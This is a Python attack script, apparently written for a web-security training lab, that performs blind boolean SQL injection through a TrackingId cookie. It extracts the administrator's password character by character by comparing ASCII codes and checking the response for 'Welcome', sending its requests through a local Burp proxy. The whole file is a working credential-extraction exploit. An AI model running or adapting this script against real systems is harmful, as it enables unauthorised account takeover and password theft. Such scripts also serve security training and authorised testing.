import requests
import sys
import urllib3
import urllib
from datetime import datetime
import time
from bs4 import BeautifulSoup

#disable ssl warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#set burp proxies
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#sql password cracker, vars: url, trackingid, sessionid
def sqli_password(url, trackingid, session):
    #set extracted password to null
    password_extracted = ""
    #loop from 1 to 21
    for i in range (1,21):
        #loop from 32 to 126 (ASCII code)
        for j in range(32,126):
            #perform select statement, starting at the first character of the password, get 1 character. Check it against the char code for ASCII
            sqli_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--"
            #url encode the string https://docs.python.org/3/library/urllib.parse.html
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            #set the tracking cookie to our payload
            cookie = {'TrackingId': trackingid + sqli_payload_encoded, 'session': session}
            #make a request with our parameters
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
            #if Welcome is not in the text, \r carriage return, write extracted password so far and the current ASCII character
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted +chr(j))
                sys.stdout.flush()
            else:
                #set extracted password to ASCII char
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break


def main():
    if len(sys.argv) != 4:
        print('[-] Usage: {} <url> <trackingid> <sessioncookie>'.format(sys.argv[0]))
        print('[-] Usage: {} www.example.com'.format(sys.argv[0]))
    url = sys.argv[1]
    trackingid = sys.argv[2]
    session = sys.argv[3]
    print("(+) Retrieving admins password...")
    print(">Execution Started {}".format(datetime.today().strftime("%Y-%m-%d %H:%M:%S")))
    sqli_password(url, trackingid, session)
    print(">Execution Ended {}".format(datetime.today().strftime("%Y-%m-%d %H:%M:%S")))





if __name__ == "__main__":
    main()